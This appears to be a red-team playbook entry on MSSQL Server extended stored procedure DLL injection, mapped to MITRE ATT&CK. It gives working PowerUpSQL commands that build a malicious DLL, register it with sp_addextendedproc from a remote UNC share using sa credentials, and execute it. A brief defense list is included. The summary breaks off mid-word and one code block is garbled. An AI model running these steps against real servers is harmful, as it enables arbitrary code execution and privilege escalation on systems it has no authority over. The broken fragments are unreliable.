---
id: 5e094f27-cdd2-4a2f-b117-52a77fae9ed7
name: MSSQL Server Extended Stored Procedure DLL Injection
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:20.305717+00:00'
updated_at: '2023-04-10T20:36:30.714417+00:00'
tactics:
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
- '[[Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
- '[[Code Signing|T1116 - Code Signing]]'
- '[[Process Injection|T1055 - Process Injection]]'
sub_techniques:
- '[[Dynamic-link Library Injection|T1055.001 - Dynamic-link Library Injection]]'
tags:
- '[[Add the extended stored procedure and list extended stored procedures]]'
- '[[Extended Stored Procedure]]'
- '[[MSSQL Server]]'
commands:
- '[[Call xp_test]]'
- '[[Create evil DLL]]'
- '[[List existing]]'
- '[[Load DLL and call xp_test]]'
---

# MSSQL Server Extended Stored Procedure DLL Injection

## Summary

MSSQL Server Extended Stored Procedures are routines that execute in the address space of the SQL Server process. This procedure adds a malicious DLL as an extended stored procedure and executes it. This allows an attacker to execute arbitrary code in the context of the SQL Server process and poten

## Description

# Description

MSSQL Server Extended Stored Procedures are routines that execute in the address space of the SQL Server process. This procedure adds a malicious DLL as an extended stored procedure and executes it. This allows an attacker to execute arbitrary code in the context of the SQL Server process and potentially gain control of the underlying system. This attack can be used to escalate privileges or persist on a compromised system.

To execute this attack, the attacker must have access to the MSSQL Server and be able to create and execute a malicious DLL. The attacker can use this attack to gain access to sensitive data or to pivot to other systems on the network.

 

## Requirements

1. Access to the MSSQL Server

1. Ability to create and execute a malicious DLL

 

## Defense

1. Restrict access to the MSSQL Server to only authorized users

1. Monitor for DLL injection techniques and unexpected stored procedures

1. Implement application whitelisting to prevent the execution of unauthorized DLLs

 

## Objectives

1. Execute arbitrary code in the context of the SQL Server process

1. Escalate privileges or persist on a compromised system

1. Gain access to sensitive data or pivot to other systems on the network

 

# Instructions

1. This command creates a malicious DLL and executes it on a target SQL server. It first creates the DLL using the Create-SQLFileXpDll command and exports it as 'xp_test' to C:\temp\test.dll. The DLL contains a command to create a file called test.txt in the same location. The DLL is then loaded onto the target server using the sp_addextendedproc command and executed using the xp_test command.

 



**Code**: [[# Create evil DLL
Create-SQLFileXpDll -OutFile C:\]]



> The Create-SQLFileXpDll command creates a DLL file that can be executed on a SQL server. The -OutFile parameter specifies the file path and name for the DLL. The -Command parameter specifies the command to be executed when the DLL is loaded. The -ExportName parameter specifies the name of the extended stored procedure that will be created from the DLL.

The Get-SQLQuery command executes a SQL query on a target SQL server. The -UserName and -Password parameters specify the credentials for the SQL server. The -Instance parameter specifies the SQL server instance. The -Query parameter specifies the SQL query to be executed.

The sp_addextendedproc command adds an extended stored procedure to a SQL server. The first parameter specifies the name of the stored procedure and the second parameter specifies the location of the DLL file. The xp_test command executes the extended stored procedure created from the DLL.

The Get-SQLStoredProcedureXP command lists all the extended stored procedures on a SQL server.



**Command** ([[Create evil DLL]]):

```bash
Create-SQLFileXpDll -OutFile C:\temp\test.dll -Command "echo test > c:\temp\test.txt" -ExportName xp_test
```





**Command** ([[Load DLL and call xp_test]]):

```bash
Get-SQLQuery -UserName sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Query "sp_addextendedproc 'xp_test', '\\10.10.0.1\temp\test.dll'"
```





**Command** ([[Call xp_test]]):

```bash
Get-SQLQuery -UserName sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Query "EXEC xp_test"
```





**Command** ([[List existing]]):

```bash
Get-SQLStoredProcedureXP -Instance "<DBSERVERNAME\DBInstance>" -Verbose
```



## MITRE ATT&CK Mapping

### Tactics

- [[Defense Evasion|TA0005 - Defense Evasion]]
- [[Privilege Escalation|TA0004 - Privilege Escalation]]

### Techniques

- [[Code Signing|T1116 - Code Signing]]
- [[Process Injection|T1055 - Process Injection]]

### Sub-Techniques

- [[Dynamic-link Library Injection|T1055.001 - Dynamic-link Library Injection]]

## Commands Used

- [[Call xp_test]]
- [[Create evil DLL]]
- [[List existing]]
- [[Load DLL and call xp_test]]

## Tags

- [[Add the extended stored procedure and list extended stored procedures]]
- [[Extended Stored Procedure]]
- [[MSSQL Server]]


